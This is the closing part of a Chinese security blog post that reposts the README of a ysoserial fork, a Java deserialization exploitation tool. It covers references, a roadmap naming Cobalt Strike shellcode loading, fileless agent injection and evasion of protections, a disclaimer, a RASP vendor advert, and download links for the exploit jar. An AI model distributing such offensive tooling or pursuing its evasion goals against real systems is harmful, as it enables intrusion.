+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E5%8F%82%E8%80%83"></a>参考</h1><p>本项目参考了若干其他项目，包括但不限于：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Y4er/ysoserial">https://github.com/Y4er/ysoserial</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns/">https://github.com/kezibei/Urldns/</a></li>
+</ul>
+<p>有兴趣的伙伴可以自行查看。</p>
+<h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E6%9B%B4%E6%96%B0"></a>更新</h1><p>在可预见的未来内会更新如下功能，敬请期待：</p>
+<ul>
+<li>加载 CS shellcode（还没学会）；</li>
+<li>无文件落地 Agent 注入（还没学会）；</li>
+<li>持续绕过各种防护（我是实验室黑客，实战还没学会）。</li>
+</ul>
+<p>或者你有什么其他的想法或需求，可以与我进行联系。</p>
+<h1 id="提问与交流"><a href="#提问与交流" class="headerlink" title="提问与交流"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E6%8F%90%E9%97%AE%E4%B8%8E%E4%BA%A4%E6%B5%81"></a>提问与交流</h1><p>本项目全部利用链全部功能以及全部利用链都经过本人本地环境的完整测试。但考虑到实际环境复杂，在实际使用中还可能遇到各种各样的问题，欢迎大家一起测试，提出 ISSUES。</p>
+<p>如果在项目使用时遇到任何问题，欢迎添加微信 K_MnO4 （高锰酸钾） ，或邮件 <a href="mailto:su18@javaweb.org">su18@javaweb.org</a> 进行交流。</p>
+<p>关于 Java 安全的任意问题也可以与我进行交流，欢迎进入 <a target="_blank" rel="noopener" href="https://javasec.org/">JavaSec</a> 交流群进行交流。</p>
+<h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"></a>免责声明</h1><p>根据《中华人民共和国网络安全法》第十二条规定：任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一。</p>
+<p>本程序应仅用于授权的安全测试与研究目的。任何未经授权的网络攻击行为会被认定为违法犯罪，将会受到法律的严厉制裁。</p>
+<h1 id="防御与修复"><a href="#防御与修复" class="headerlink" title="防御与修复"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"></a>防御与修复</h1><p>在使用本项目自查后，发现可以进行攻击，下一步该如何对其进行防护与修复呢？</p>
+<p>经过实际环境的验证，发现使用 RASP 技术可以最好的进行安全层面的防护，经过完整的测试后，本项目所使用的全部攻击技术都可以被 <a target="_blank" rel="noopener" href="http://www.anbai.com/product_lx.html">灵蜥 — 应用系统攻击自免疫平台</a> RASP 产品完美防护，欢迎大家联系电话 010-61943626 或邮件 <a href="mailto:marketing@anbai.com">marketing@anbai.com</a> 进行咨询和了解。</p>
+<h2 id="工具下载地址"><a href="#工具下载地址" class="headerlink" title="工具下载地址:"></a>工具下载地址:</h2><h3 id="①GitHub"><a href="#①GitHub" class="headerlink" title="①GitHub:"></a>①GitHub:</h3><p><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/releases/download/v0.1/ysuserial-0.1-su18-all.jar">ysuserial-0.1-su18-all.jar</a></p>
+<h3 id="②云中转网盘"><a href="#②云中转网盘" class="headerlink" title="②云中转网盘:"></a>②云中转网盘:</h3><p><a target="_blank" rel="noopener" href="https://www.yunzhongzhuan.com/#sharefile=Fvm7RDFK_55814">yunzhongzhuan.com&#x2F;#sharefile&#x3D;Fvm7RDFK_55814  
+</a>解压密码:<strong>&#x3D;&#x3D;<a target="_blank" rel="noopener" href="http://www.ddosi.org==/">www.ddosi.org==</a></strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="category-chain-item">安全工具</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://red-fair.github.io/red-fair.github.io/2023/08/01/网络安全/安全工具/ysoserial Java反序列化漏洞验证利用工具/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>云怡</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 1, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/%E9%9B%A8%E8%8B%81%E5%B7%A5%E5%85%B7/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/xray%E5%9F%BA%E6%9C%AC%E6%95%99%E7%A8%8B%E5%92%8Crad%E8%81%94%E5%8A%A8%E6%95%99%E7%A8%8B%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
